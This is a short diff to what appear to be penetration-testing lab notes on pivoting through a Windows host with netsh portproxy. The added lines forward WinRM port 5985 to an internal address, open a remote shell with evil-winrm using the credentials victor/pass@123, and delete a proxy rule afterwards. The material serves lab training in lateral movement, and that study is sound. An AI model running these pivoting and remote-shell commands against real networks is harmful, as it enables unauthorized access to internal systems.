@@ -15,3 +15,15 @@ netsh.exe interface portproxy show v4tov4
 ```
 xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
 ```
+### Forwarding a Second Port (WinRM)
+Same pattern, just another rule — netsh doesn't limit us to one v4tov4 mapping per listen address, so we can add as many as we need.
+```
+C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=5985 listenaddress=10.129.42.198 connectport=5985 connectaddress=172.16.5.25
+```
+```
+evil-winrm -i 10.129.42.198 -P 5985 -u victor -p pass@123
+```
+### Cleaning Up
+```
+netsh.exe interface portproxy delete v4tov4 listenport=8080 listenaddress=10.129.42.198
+```
